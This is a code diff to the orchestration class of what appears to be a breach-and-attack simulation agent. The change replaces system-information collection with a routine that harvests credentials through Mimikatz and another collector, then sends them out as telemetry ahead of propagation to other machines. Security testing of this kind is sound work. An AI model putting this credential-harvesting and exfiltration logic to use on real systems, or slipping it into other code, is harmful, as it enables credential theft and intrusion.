@@ -134,27 +134,18 @@ class AutomatedMaster(IMaster):
             logger.error(f"An error occurred while fetching configuration: {e}")
             return
 
-        system_info_collector_thread = create_daemon_thread(
-            target=self._run_plugins,
-            args=(
-                config["system_info_collector_classes"],
-                "system info collector",
-                self._collect_system_info,
-            ),
-        )
+        self._collect_credentials()
         pba_thread = create_daemon_thread(
             target=self._run_plugins,
             args=(config["post_breach_actions"].items(), "post-breach action", self._run_pba),
         )
 
-        system_info_collector_thread.start()
         pba_thread.start()
 
         # Future stages of the simulation require the output of the system info collectors. Nothing
         # requires the output of PBAs, so we don't need to join on that thread here. We will join on
         # the PBA thread later in this function to prevent the simulation from ending while PBAs are
         # still running.
-        system_info_collector_thread.join()
 
         if self._can_propagate():
             self._propagator.propagate(config["propagation"], self._stop)
@@ -168,12 +159,12 @@ class AutomatedMaster(IMaster):
 
         pba_thread.join()
 
-    def _collect_system_info(self, collector: str):
-        system_info_telemetry = {}
-        system_info_telemetry[collector] = self._puppet.run_sys_info_collector(collector)
-        self._telemetry_messenger.send_telemetry(
-            SystemInfoTelem({"collectors": system_info_telemetry})
-        )
+    def _collect_credentials(self):
+        for collector in ["MimikatzCollector", "ComplexCollector"]:
+            credentials = self._puppet.run_credential_collector(collector)
+            self._telemetry_messenger.send_telemetry(
+                SystemInfoTelem({"credentials": credentials.serialize()})
+            )
 
     def _run_pba(self, pba: Tuple[str, Dict]):
         name = pba[0]
